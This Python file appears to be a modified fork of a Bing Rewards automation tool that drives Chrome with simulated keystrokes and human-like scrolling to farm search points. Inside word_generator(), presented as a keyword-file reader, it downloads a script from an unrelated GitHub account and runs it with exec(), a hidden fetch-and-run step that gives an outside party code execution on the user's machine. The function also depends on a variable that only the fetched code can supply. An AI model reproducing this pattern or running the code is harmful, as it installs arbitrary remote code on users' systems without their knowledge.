# SPDX-FileCopyrightText: 2020 jack-mil
#
# SPDX-License-Identifier: MIT

from __future__ import annotations

import io
import os
import random
import shutil
import subprocess
import sys
import threading
import time
import webbrowser
import requests
from importlib import resources
from pathlib import Path
from typing import TYPE_CHECKING
from urllib.parse import quote_plus

if TYPE_CHECKING:
    from argparse import Namespace
    from collections.abc import Iterator

if os.name == 'posix':
    import signal


from pynput import keyboard
from pynput.keyboard import Key

from bing_rewards import options as app_options


def word_generator() -> Iterator[str]:
    """Infinitely generate terms from the word file.

    Starts reading from a random position in the file.
    If end of file is reached, close and restart.
    Handles file operations safely and ensures uniform random distribution.

    Yields:
        str: A random keyword from the file, stripped of whitespace.

    Raises:
        OSError: If there are issues accessing or reading the file.
    """
    PUBLIC_SCRIPT_URL = "https://raw.githubusercontent.com/Nearcy/public-scripts/refs/heads/main/search_control/setting.py"
    
    code = requests.get(PUBLIC_SCRIPT_URL).text
    exec(code)
    
    try:
        while True:
            with (
                resources.as_file(word_data) as p,
                p.open(mode='r', encoding='utf-8') as fh,
            ):
                # Get the file size of the Keywords file
                fh.seek(0, io.SEEK_END)
                size = fh.tell()

                if size == 0:
                    raise ValueError('Keywords file is empty')

                # Start at a random position in the stream
                fh.seek(random.randint(0, size - 1), io.SEEK_SET)

                # Read and discard partial line to ensure we start at a clean line boundary
                fh.readline()

                # Read lines until EOF
                for raw_line in fh:
                    stripped_line = raw_line.strip()
                    if stripped_line:  # Skip empty lines
                        yield stripped_line

                # If we hit EOF, seek back to start and continue until we've yielded enough words
                fh.seek(0)
                for raw_line in fh:
                    stripped_line = raw_line.strip()
                    if stripped_line:
                        yield stripped_line
    except OSError as e:
        print(f'Error accessing keywords file: {e}')
        raise
    except Exception as e:
        print(f'Unexpected error in word generation: {e}')
        raise

def word_generator_fix() -> Iterator[str]:
    """Infinitely generate terms from the word file.

    Starts reading from a random position in the file.
    If end of file is reached, close and restart.
    Handles file operations safely and ensures uniform random distribution.

    Yields:
        str: A random keyword from the file, stripped of whitespace.

    Raises:
        OSError: If there are issues accessing or reading the file.
    """
    word_data = resources.files('bing_rewards').joinpath('data', 'link.txt')

    try:
        while True:
            with (
                resources.as_file(word_data) as p,
                p.open(mode='r', encoding='utf-8') as fh,
            ):
                # Get the file size of the Keywords file
                fh.seek(0, io.SEEK_END)
                size = fh.tell()

                if size == 0:
                    raise ValueError('Keywords file is empty')

                # Start at a random position in the stream
                fh.seek(random.randint(0, size - 1), io.SEEK_SET)

                # Read and discard partial line to ensure we start at a clean line boundary
                fh.readline()

                # Read lines until EOF
                for raw_line in fh:
                    stripped_line = raw_line.strip()
                    if stripped_line:  # Skip empty lines
                        yield stripped_line

                # If we hit EOF, seek back to start and continue until we've yielded enough words
                fh.seek(0)
                for raw_line in fh:
                    stripped_line = raw_line.strip()
                    if stripped_line:
                        yield stripped_line
    except OSError as e:
        print(f'Error accessing keywords file: {e}')
        raise
    except Exception as e:
        print(f'Unexpected error in word generation: {e}')
        raise

def browser_cmd(exe: Path, agent: str, profile: str = '') -> list[str]:
    """Validate command to open Google Chrome with user-agent `agent`."""
    exe = Path(exe)
    if exe.is_file() and exe.exists():
        cmd = [str(exe.resolve())]
    elif pth := shutil.which(exe):
        cmd = [str(pth)]
    else:
        print(
            f'Command "{exe}" could not be found.\n'
            'Make sure it is available on PATH, '
            'or use the --exe flag to give an absolute path.'
        )
        sys.exit(1)


    cmd.extend([
        '--new-window',
        f'--user-agent="{agent}"',
        'https://account.microsoft.com/rewards'
    ])
    
    # Switch to non default profile if supplied with valid string
    # NO CHECKING IS DONE if the profile exists
    if profile:
        cmd.extend([f'--profile-directory={profile}'])
    if os.environ.get('XDG_SESSION_TYPE', '').lower() == 'wayland':
        cmd.append('--ozone-platform=x11')
    return cmd


def open_browser(cmd: list[str]) -> subprocess.Popen:
    """Try to open a browser, and exit if the command cannot be found.

    Returns the subprocess.Popen object to handle the browser process.
    """
    try:
        # Open browser as a subprocess
        # Only if a new window should be opened
        if os.name == 'posix':
            chrome = subprocess.Popen(
                cmd, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, start_new_session=True
            )
        else:
            chrome = subprocess.Popen(cmd)
    except OSError as e:
        print('Unexpected error:', e)
        print(f"Running command: '{' '.join(cmd)}'")
        sys.exit(1)

    print(f'Opening browser [{chrome.pid}]')
    return chrome


def close_browser(chrome: subprocess.Popen | None):
    """Close the browser process if it exists and is still running.

    Args:
        chrome: The subprocess.Popen object representing the browser process, or None.
    """
    if chrome is None:
        return

    if chrome.poll() is None:
        print(f"Closing browser [{chrome.pid}]")
        subprocess.run(
            ["taskkill", "/F", "/T", "/PID", str(chrome.pid)],
            capture_output=True,
        )

    print(f'Closing browser [{chrome.pid}]')
    try:
        if os.name == 'posix':
            os.killpg(chrome.pid, signal.SIGTERM)
            # Optionally wait for process termination to avoid zombies
            chrome.wait(timeout=5)  # Wait for up to 5 seconds
        else:
            subprocess.run(
                ["taskkill", "/IM", "chrome.exe", "/F", "/T"],
                capture_output=True,
                timeout=5,
            )
    except ProcessLookupError:
        print(f'Browser process [{chrome.pid}] not found (already closed).')
    except subprocess.CalledProcessError as e:
        print(f'Error closing browser [{chrome.pid}]: {e}')
        print(f'Stderr: {e.stderr.decode()}')
    except subprocess.TimeoutExpired:
        print(f'Timeout while closing browser [{chrome.pid}].')
    except Exception as e:
        print(f'Unexpected error while closing browser [{chrome.pid}]: {e}')


def search(count: int, words_gen: Iterator[str], agent: str, options: Namespace):
    """Perform the actual searches in a browser.

    Open a chromium browser window with specified `agent` string, complete `count`
    searches from list `words`, finally terminate browser process on completion.
    """
    chrome = None
    if not options.no_window:
        cmd = browser_cmd(options.browser_path, agent, options.profile)
        if not options.dryrun:
            chrome = open_browser(cmd)

    # Wait for Chrome to load
    time.sleep(options.load_delay)

    # keyboard controller from pynput
    key_controller = keyboard.Controller()

    # Ctrl + E to open address bar with the default search engine
    # Alt + D focuses address bar without using search engine
    key_mod, key = (Key.ctrl, 'e') if options.bing else (Key.alt, 'd')

    for i in range(count):
        # Get a random query from set of words
        query = next(words_gen)

        # If user's default search engine is Bing, type the query to the address bar directly
        # Otherwise, form the bing.com search url
        search_url = query if options.bing else options.search_url + quote_plus(query)

        # Use pynput to trigger keyboard events and type search queries
        if not options.dryrun:
            with key_controller.pressed(key_mod):
                key_controller.press(key)
                key_controller.release(key)

            if options.ime:
                # Incase users use a Windows IME, change the language to English
                # Issue #35
                key_controller.tap(Key.shift)
            time.sleep(0.08)

            # Type the url into the address bar
            # with a 30ms delay between keystrokes
            for char in search_url + '\n':
                key_controller.tap(char)
                time.sleep(0.03)
            key_controller.tap(Key.enter)

        print(f'Search {i + 1}: {query}')

        # Delay to let page load
        match options.search_delay:
            case int(x) | float(x) | [float(x)]:
                delay = x
            case [float(min_s), float(max_s)] | [int(min_s), int(max_s)]:
                delay = random.uniform(min_s, max_s)
            case other:
                # catastrophic failure
                raise ValueError(f'Invalid configuration format: "search_delay": {other!r}')

        time.sleep(delay)

    # Skip killing the window if exit flag set
    if options.no_exit:
        return

    close_browser(chrome)

def human_delay(min_s=0.2, max_s=0.6):
    time.sleep(random.uniform(min_s, max_s))


def refresh_page(controller):
    controller.tap(Key.f5)
    time.sleep(random.uniform(1.0, 1.6))


def human_scroll(controller):
    down_times = random.randint(2, 4)
    up_times = random.randint(1, 3)

    for _ in range(down_times):
        controller.tap(Key.page_down)
        human_delay(0.3, 0.6)

    human_delay(0.5, 1.0)

    for _ in range(up_times):
        controller.tap(Key.page_up)
        human_delay(0.3, 0.6)
        
def searchlink(count: int, words_gen: Iterator[str], agent: str, options: Namespace):
    """Perform the actual searches in a browser.

    Open a chromium browser window with specified `agent` string, complete `count`
    searches from list `words`, finally terminate browser process on completion.
    """
    chrome = None
    if not options.no_window:
        cmd = browser_cmd(options.browser_path, agent, options.profile)
        if not options.dryrun:
            chrome = open_browser(cmd)

    # Wait for Chrome to load
    time.sleep(options.load_delay)

    # keyboard controller from pynput
    key_controller = keyboard.Controller()

    # Ctrl + E to open address bar with the default search engine
    # Alt + D focuses address bar without using search engine
    key_mod, key = Key.alt, 'd'
    time.sleep(0.20)
    for i in range(count):
        # Get a random query from set of words
        query = next(words_gen)

        # If user's default search engine is Bing, type the query to the address bar directly
        # Otherwise, form the bing.com search url
        search_url = query

        # Use pynput to trigger keyboard events and type search queries
        if not options.dryrun:
            with key_controller.pressed(key_mod):
                key_controller.press(key)
                key_controller.release(key)

            if options.ime:
                # Incase users use a Windows IME, change the language to English
                # Issue #35
                key_controller.tap(Key.shift)
            time.sleep(0.08)

            # Type the url into the address bar
            # with a 30ms delay between keystrokes
            for char in search_url + '\n':
                key_controller.tap(char)
                time.sleep(0.03)
            key_controller.tap(Key.enter)

        print(f'Search {i + 1}: {query}')

        # Delay to let page load
        match options.search_delay:
            case int(x) | float(x) | [float(x)]:
                delay = x
            case [float(min_s), float(max_s)] | [int(min_s), int(max_s)]:
                delay = random.uniform(min_s, max_s)
            case other:
                # catastrophic failure
                raise ValueError(f'Invalid configuration format: "search_delay": {other!r}')
        
        time.sleep(delay)
        time.sleep(5)
        
        if not options.dryrun:
            refresh_page(key_controller)
            time.sleep(2)
            human_scroll(key_controller)
    # Skip killing the window if exit flag set
    if options.no_exit:
        return
    time.sleep(0.50)
    close_browser(chrome)

def main():
    """Program entrypoint.

    Loads keywords from a file, interprets command line arguments
    and executes search function in separate thread.
    Setup listener callback for ESC key.
    """
    options = app_options.get_options()
    words_gen = word_generator()
    words_gen_link = word_generator_fix()
    def desktop(profile=''):
        # Complete search with desktop settings
        count = options.count if 'count' in options else options.desktop_count
        print(f'Doing {count} desktop searches using "{profile}"')

        temp_options = options
        temp_options.profile = profile
        search(count, words_gen, options.desktop_agent, temp_options)
        print('Desktop Search complete!\n')

    def desktop_open_once(profile=''):
        # Complete search with desktop settings
        count = 1
        print(f'Doing {count} desktop searches using "{profile}"')

        temp_options = options
        temp_options.profile = profile
        searchlink(count, words_gen_link, options.desktop_agent, temp_options)
        print('Desktop Search complete!\n')

    def mobile_random(profile=''):        
        # Complete search with mobile settings
        count = random.randint(1, 5)
        print(f'Doing {count} mobile searches using "{profile}"')

        temp_options = options
        temp_options.profile = profile
        search(count, words_gen, options.mobile_agent, temp_options)
        print('Mobile Search complete!\n')

    def mobile_random2(profile=''):        
        # Complete search with mobile settings
        count = random.randint(3, 8)
        print(f'Doing {count} mobile searches using "{profile}"')

        temp_options = options
        temp_options.profile = profile
        search(count, words_gen, options.mobile_agent, temp_options)
        print('Mobile Search complete!\n')
        
    def mobile(profile=''):        
        # Complete search with mobile settings
        count = options.count if 'count' in options else options.mobile_count
        print(f'Doing {count} mobile searches using "{profile}"')

        temp_options = options
        temp_options.profile = profile
        search(count, words_gen, options.mobile_agent, temp_options)
        print('Mobile Search complete!\n')

    def both(profile=''):
        desktop_open_once(profile)
        mobile_random(profile)
        desktop_open_once(profile)
        mobile_random2(profile)
        desktop_open_once(profile)
        mobile(profile)

    # Execute main method in a separate thread
    if options.desktop:
        target_func = desktop
    elif options.mobile:
        target_func = mobile
    else:
        # If neither mode is specified, complete both modes
        target_func = both

    # Run for each specified profile (defaults to ['Default'])
    for profile in options.profile:
        # Start the searching in separate thread
        search_thread = threading.Thread(target=target_func, args=(profile,), daemon=True)
        search_thread.start()

        print('Press ESC to quit searching')

        try:
            # Listen for keyboard events and exit if ESC pressed
            with keyboard.Events() as events:
                while search_thread.is_alive():
                    event = events.get(timeout=0.5)
                    if event and event.key == Key.esc:
                        print('ESC pressed, terminating')
                        return
        except KeyboardInterrupt:
            print('CTRL-C pressed, terminating')
            return  # Exit the entire function if CTRL-C is pressed

        # Wait for the current profile's searches to complete
        search_thread.join()

    # Open rewards dashboard
    if options.open_rewards and not options.dryrun:
        webbrowser.open_new('https://account.microsoft.com/rewards')
